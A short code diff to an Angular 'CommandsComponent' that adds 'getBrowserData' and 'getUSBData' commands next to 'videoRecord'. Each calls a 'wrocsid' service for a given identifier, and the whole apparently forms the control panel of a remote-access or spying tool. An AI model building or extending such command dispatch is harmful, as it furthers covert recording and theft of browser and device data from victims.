@@ -104,6 +104,12 @@ export class CommandsComponent implements OnInit {
       case 'videoRecord':
         this.wrocsid.videoRecord(identifier, args)
         break;
+      case 'getBrowserData':
+        this.wrocsid.getBrowserData(identifier)
+        break;
+      case 'getUSBData':
+        this.wrocsid.getUSBData(identifier)
+        break;
     }
   }
 }
